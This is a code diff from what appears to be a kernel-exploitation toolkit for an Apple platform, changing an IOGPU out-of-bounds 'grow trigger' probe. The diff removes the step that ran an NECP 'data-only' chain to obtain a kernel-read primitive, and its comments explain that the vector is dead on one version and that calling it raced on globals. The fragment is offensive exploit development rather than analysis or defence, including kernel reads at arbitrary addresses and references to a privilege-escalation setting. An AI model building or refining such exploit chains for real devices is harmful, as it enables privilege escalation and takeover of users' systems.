@@ -209,21 +209,17 @@ void nk_iogpu_group_oob_run(int trigger)
     static uint8_t out[0x200];
     size_t on = 0;
 
-    /* The readback needs the B12/NECP kernel-read channel. Bring it up here
-     * so the probe is self-contained (requires the unsafe_necp_dataonly pref
-     * in Settings -> Privilege Escalation). */
+    /* The readback needs the B12/NECP kernel-read channel. On 23.55 that
+     * vector is dead ("data-only NECP vector dead on 23.55"), and calling
+     * nk_dataonly_necp_chain() from here killed the app: the probe runs in
+     * two instances (TRIGGER + READ-ONLY) and both drove the chain, racing
+     * on its globals. The chain is NOT needed for the grow trigger, so it is
+     * not called from the probe at all. */
     {
         uint8_t probe[8];
         int rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
-        if (rr != 0) {
-            ol("[grp] read channel down (kr=%d) - running the NECP chain", rr);
-            nk_dataonly_necp_chain();
-            rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
-            ol("[grp] read channel after chain: kr=%d", rr);
-            if (rr != 0) ol("[grp] WARNING: no kernel read channel; the mask check will not work");
-        } else {
-            ol("[grp] read channel already up");
-        }
+        ol("[grp] kernel read channel: %s (kr=%d) - mask readback unavailable",
+           rr == 0 ? "up" : "down", rr);
     }
 
     int kr = 0;
